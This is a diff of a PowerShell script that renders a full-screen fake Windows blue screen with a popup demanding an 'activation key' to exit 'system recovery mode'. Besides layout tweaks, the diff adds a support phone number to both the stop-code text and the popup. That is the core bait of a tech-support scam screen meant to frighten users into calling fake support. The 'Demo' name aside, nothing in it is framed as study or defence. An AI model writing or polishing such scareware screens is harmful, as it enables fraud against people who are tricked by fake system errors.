@@ -51,16 +51,16 @@ PS> Show-BSODDemo
 	$bsodFace.Font = New-Object System.Drawing.Font('Segoe UI Light', 130, [System.Drawing.FontStyle]::Regular)
 	$bsodFace.ForeColor = [System.Drawing.Color]::White
 	$bsodFace.AutoSize = $true
-	$bsodFace.Location = New-Object System.Drawing.Point(160, 30)
+	$bsodFace.Location = New-Object System.Drawing.Point(220, 60)
 	$bsodFace.BackColor = $form.BackColor
 	$form.Controls.Add($bsodFace)
 
 	$mainMessage = New-Object System.Windows.Forms.Label
 	$mainMessage.AutoSize = $false
-	$mainMessage.Width = 700
-	$mainMessage.Height = 120
+	$mainMessage.Width = 900
+	$mainMessage.Height = 150
 	$mainMessage.Font = New-Object System.Drawing.Font('Segoe UI Light', 22, [System.Drawing.FontStyle]::Regular)
-	$mainMessage.Location = New-Object System.Drawing.Point(160, 230)
+	$mainMessage.Location = New-Object System.Drawing.Point(220, 220)
 	$mainMessage.Text = $mainText
 	$mainMessage.ForeColor = [System.Drawing.Color]::White
 	$mainMessage.BackColor = $form.BackColor
@@ -73,7 +73,7 @@ PS> Show-BSODDemo
 
 	$qrBox = New-Object System.Windows.Forms.PictureBox
 	$qrBox.Size = New-Object System.Drawing.Size(110, 110)
-	$qrBox.Location = New-Object System.Drawing.Point(160, 410)
+	$qrBox.Location = New-Object System.Drawing.Point(220, 440)
 	$qrBox.BackColor = [System.Drawing.Color]::White
 	$qrBox.BorderStyle = [System.Windows.Forms.BorderStyle]::None
 	$qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
@@ -90,13 +90,13 @@ PS> Show-BSODDemo
 	}
 
 	$qrText = New-Object System.Windows.Forms.Label
-	$qrText.Text = "For more information about this issue and possible fixes, visit`r`nhttps://www.windows.com/stopcode`r`n`r`nIf you call a support person, give them this info.`r`nStop code: DRIVER_PNP_WATCHDOG"
+	$qrText.Text = "For more information about this issue and possible fixes, visit`r`nhttps://www.windows.com/stopcode`r`n`r`nIf you call a support person, give them this info.`r`nStop code: DRIVER_PNP_WATCHDOG`r`nSupport: +1-888-888-8888"
 	$qrText.Font = New-Object System.Drawing.Font('Segoe UI Light', 13, [System.Drawing.FontStyle]::Regular)
 	$qrText.ForeColor = [System.Drawing.Color]::White
 	$qrText.AutoSize = $false
 	$qrText.Width = 500
-	$qrText.Height = 120
-	$qrText.Location = New-Object System.Drawing.Point(285, 415)
+	$qrText.Height = 150
+	$qrText.Location = New-Object System.Drawing.Point(345, 445)
 	$form.Controls.Add($qrText)
 
 	# Vertical progress bar hidden - not in reference
@@ -117,12 +117,12 @@ PS> Show-BSODDemo
 	$popup = New-Object System.Windows.Forms.Panel
 	$screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
 	$popupWidth = 460
-	$popupHeight = 210
+	$popupHeight = 230
 	# Right half ka center - content left 55% tak hai, right 45% khali hai
 	$rightAreaStart = [int]($screenBounds.Width * 0.57)
 	$rightAreaWidth = $screenBounds.Width - $rightAreaStart
 	$popupX = $rightAreaStart + [int](($rightAreaWidth - $popupWidth) / 2)
-	$popupY = [int](($screenBounds.Height - $popupHeight) / 2)
+	$popupY = $screenBounds.Height - $popupHeight - 120
 	$popup.Location = New-Object System.Drawing.Point($popupX, $popupY)
 	$popup.Size = New-Object System.Drawing.Size($popupWidth, $popupHeight)
 	$popup.BackColor = [System.Drawing.Color]::FromArgb(238, 238, 238)
@@ -190,12 +190,13 @@ PS> Show-BSODDemo
 	$popup.Controls.Add($popupTitle)
 
 	$popupText = New-Object System.Windows.Forms.Label
-	$popupText.Text = 'Enter 10-digit activation key to exit system recovery mode:'
+	$popupText.Text = "Enter 10-digit activation key to exit system recovery mode:`r`nCall support at +1-888-888-8888"
 	$popupText.Font = New-Object System.Drawing.Font('Segoe UI', 12)
 	$popupText.ForeColor = [System.Drawing.Color]::FromArgb(36, 36, 36)
+	$popupText.BackColor = [System.Drawing.Color]::Transparent
 	$popupText.AutoSize = $false
 	$popupText.Width = 410
-	$popupText.Height = 50
+	$popupText.Height = 70
 	$popupText.Location = New-Object System.Drawing.Point(15, 15)
 	$popupText.MaximumSize = New-Object System.Drawing.Size(410, 0)
 	$popup.Controls.Add($popupText)
@@ -207,7 +208,7 @@ PS> Show-BSODDemo
 	$errorLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 0, 0)
 	$errorLabel.Font = New-Object System.Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
 	$errorLabel.AutoSize = $true
-	$errorLabel.Location = New-Object System.Drawing.Point(15, 130)
+	$errorLabel.Location = New-Object System.Drawing.Point(15, 150)
 	$errorLabel.Visible = $false
 	$popup.Controls.Add($errorLabel)
 
@@ -215,7 +216,7 @@ PS> Show-BSODDemo
 	$keyInput.Width = 400
 	$keyInput.Height = 30
 	$keyInput.Font = New-Object System.Drawing.Font('Segoe UI', 13)
-	$keyInput.Location = New-Object System.Drawing.Point(15, 68)
+	$keyInput.Location = New-Object System.Drawing.Point(15, 88)
 	$keyInput.BackColor = [System.Drawing.Color]::White
 	$keyInput.ForeColor = [System.Drawing.Color]::Black
 	$keyInput.MaxLength = 15
@@ -269,7 +270,7 @@ PS> Show-BSODDemo
 	$okBtn.Width = 75
 	$okBtn.Height = 30
 	$okBtn.Font = New-Object System.Drawing.Font('Segoe UI', 11)
-	$okBtn.Location = New-Object System.Drawing.Point(230, 155)
+	$okBtn.Location = New-Object System.Drawing.Point(230, 175)
 	$okBtn.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
 	$okBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
 	$okBtn.Add_Click($validateActivation)
@@ -280,7 +281,7 @@ PS> Show-BSODDemo
 	$cancelBtn.Width = 80
 	$cancelBtn.Height = 30
 	$cancelBtn.Font = New-Object System.Drawing.Font('Segoe UI', 11)
-	$cancelBtn.Location = New-Object System.Drawing.Point(320, 155)
+	$cancelBtn.Location = New-Object System.Drawing.Point(320, 175)
 	$cancelBtn.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
 	$cancelBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
 	$cancelBtn.Add_Click({
